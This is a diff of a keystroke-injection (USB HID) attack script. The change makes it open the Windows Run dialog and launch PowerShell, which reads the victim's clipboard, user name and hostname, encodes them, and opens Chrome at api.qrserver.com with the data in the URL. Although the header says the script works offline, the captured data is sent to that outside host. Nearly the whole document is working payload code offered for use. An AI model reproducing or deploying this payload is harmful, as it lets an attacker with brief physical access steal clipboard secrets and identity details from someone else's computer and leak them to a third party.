@@ -3,10 +3,16 @@ REM Author: Alessandro
 REM Description: Estrae dati locali e li mostra in QR code offline
 
 EXTENSION PASSIVE_WINDOWS_DETECT
-
-GUI r
-DELAY 300
-STRINGLN powershell
+IF_TARGET WINDOWS
+  DEFAULT_DELAY 0
+  DELAY 100
+  GUI
+  DELAY 100
+  STRING r
+  DELAY 100
+  ENTER
+  DELAY 800
+END_IF
 
 STRINGLN_POWERSHELL
 Add-Type -AssemblyName System.Web
@@ -18,3 +24,4 @@ $data = "[$time][$user@$hostname] $clip"
 $encoded = [System.Web.HttpUtility]::UrlEncode([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data)))
 Start-Process chrome "--new-window https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=$encoded"
 END_STRINGLN
+"Add PASSIVE_WINDOWS_DETECT block and improved readability"
